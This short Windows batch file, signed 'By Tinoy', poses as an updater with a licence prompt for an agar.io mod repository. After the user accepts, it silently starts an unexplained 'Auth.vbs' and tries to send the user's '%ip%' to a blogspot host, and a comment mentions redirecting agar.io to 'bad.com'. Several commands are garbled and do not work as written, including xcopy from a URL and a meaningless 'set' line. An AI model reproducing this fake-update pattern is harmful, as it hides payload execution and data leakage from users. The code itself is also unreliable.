:By Tinoy
@echo off
rem Level Update This Repo
:Home
xcopy /x /z 'https://github.com/timothyfrancis/IoMods-ExternalV/'
echo. Did You Want Accept LICENCE MBIG
set /p ch=Chosse Yes/No:
if %ch%==Yes goto Yes
if %ch%==No exit
:Yes
cls
echo %temp% >> '%temp%\temp.txt'
echo Temp Seted
rem match:     agar.io
echo updateCompleted
ping localhost -n 3 >nul
cls
set digit=Update%3 %ToUpdate3 /n -n node
start Auth.vbs
echo %ip% >> TinoyServer.blogspot.com
ping agar.io {agar.io target to bad.com in hosting} >nul
echo. Update Accepted
Echo Thanks For Update!
Echo Press Any Numbers To Continue
pause >nul
